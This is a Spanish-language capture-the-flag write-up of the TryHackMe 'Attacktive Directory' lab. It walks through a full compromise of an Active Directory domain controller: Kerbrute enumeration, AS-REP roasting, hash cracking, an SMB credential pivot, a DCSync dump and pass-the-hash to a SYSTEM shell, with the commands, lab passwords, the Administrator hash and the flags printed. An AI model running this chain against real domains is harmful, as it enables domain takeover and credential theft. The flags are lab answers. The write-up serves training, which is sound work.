# TryHackMe: Attacktive Directory

**Dificultad:** Media
**Sistema Operativo:** Windows Server (Domain Controller)
**Dominio:** spookysec.local
**Herramientas usadas:** Nmap, Kerbrute, Impacket (GetNPUsers, secretsdump, psexec), John the Ripper, smbclient, xfreerdp

## Resumen

Compromiso total de un dominio de Active Directory, desde la enumeración inicial hasta una shell de `Administrator` en el Domain Controller. La cadena de ataque combinó enumeración de usuarios vía Kerberos, **AS-REP Roasting**, pivote de credenciales a través de un recurso compartido SMB, abuso de permisos de replicación (**DCSync**) y un ataque final de **Pass-the-Hash**.

## 1. Reconocimiento (Recon)

Escaneo completo de puertos con Nmap:

```bash
nmap -sV -sC -p- -T4 -Pn <IP> -oN nmap_initial.txt
```

**Puertos clave descubiertos** (perfil típico de un Domain Controller):
- **53** — DNS
- **88** — Kerberos
- **135 / 445** — RPC / SMB
- **389 / 3268** — LDAP (Active Directory)
- **3389** — RDP

El escaneo reveló el nombre del dominio: **`spookysec.local`**, y el NetBIOS domain name: **`THM-AD`**.

## 2. Enumeración de usuarios con Kerbrute

Se construyó una lista de posibles nombres de usuario y se usó **Kerbrute** para validar cuáles existen realmente en el dominio, abusando de que Kerberos responde distinto si el usuario existe o no (sin necesitar contraseña):

```bash
kerbrute userenum -d spookysec.local --dc <IP> userlist.txt
```

**Usuarios válidos confirmados:** `administrator`, `james`, `robin`, `svc-admin`, `backup`, `darkstar`.

Dos cuentas llamaron especialmente la atención por su nomenclatura: `svc-admin` (cuenta de servicio) y `backup` (cuenta de respaldo) — ambas resultaron clave en el resto del ataque.

## 3. AS-REP Roasting

Se usó el script `GetNPUsers.py` de Impacket para buscar cuentas con la preautenticación de Kerberos desactivada:

```bash
impacket-GetNPUsers spookysec.local/ -usersfile userlist.txt -dc-ip <IP> -format hashcat -outputfile asrep_hashes.txt
```

El usuario **`svc-admin`** tenía ese privilegio desactivado, entregando su hash AS-REP (Kerberos 5, etype 23) sin necesitar ninguna credencial previa.

## 4. Cracking del hash con John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

**Resultado:** `svc-admin : management2005`

## 5. Enumeración SMB y pivote de credenciales

Con las credenciales de `svc-admin`, se listaron los recursos compartidos del dominio:

```bash
smbclient -L //<IP>/ -U svc-admin%management2005
```

Entre los recursos estándar (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) apareció uno fuera de lo común: **`backup`**. Dentro se encontró un archivo `backup_credentials.txt`:

```bash
smbclient //<IP>/backup -U svc-admin%management2005
smb: \> get backup_credentials.txt
```

El contenido estaba codificado en Base64:

```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
# backup@spookysec.local:backup2517860
```

**Nuevas credenciales obtenidas:** `backup : backup2517860`

## 6. DCSync con secretsdump

El nombre de la cuenta `backup` sugería un propósito especial: resultó tener permisos de **replicación de Active Directory (DCSync)**, permitiendo volcar todos los hashes de contraseñas del dominio sin necesitar acceso directo al archivo `NTDS.DIT`:

```bash
impacket-secretsdump spookysec.local/backup:backup2517860@<IP>
```

Esto reveló los hashes NTLM de **todos los usuarios del dominio**, incluyendo:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

## 7. Pass-the-Hash para shell de Administrator

Con el hash NTLM del Administrator, no fue necesario conocer su contraseña en texto plano — se usó directamente para autenticarse vía `psexec`:

```bash
impacket-psexec administrator@<IP> -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
```

**Resultado:** shell interactiva como `NT AUTHORITY\SYSTEM` en el Domain Controller.

## 8. Banderas (Flags)

| Usuario | Método de acceso | Flag |
|---|---|---|
| Administrator | psexec (Pass-the-Hash) | `TryHackMe{4ctiveD1rectoryM4st3r}` |
| svc-admin | RDP (`xfreerdp`) | `TryHackMe{K3rb3r0s_Pr3_4uth}` |
| backup | RDP (`xfreerdp`) | `TryHackMe{B4ckM3UpSc0tty!}` |

## Lecciones aprendidas

- La preautenticación de Kerberos desactivada en una cuenta (AS-REP Roasting) es una de las formas más simples de obtener un primer punto de apoyo en un dominio, sin necesitar ninguna credencial previa.
- Los nombres de cuentas poco comunes (como `backup` o cuentas `svc-*`) suelen señalar privilegios especiales y son buenos candidatos a investigar primero durante la enumeración.
- Un permiso de replicación de AD (DCSync) mal asignado a una cuenta no administrativa puede comprometer la totalidad del dominio en un solo paso.
- Pass-the-Hash permite autenticarse con el hash NTLM directamente, sin necesidad de crackear la contraseña en texto plano — una técnica crítica que recuerda por qué rotar y proteger hashes es tan importante como proteger contraseñas.
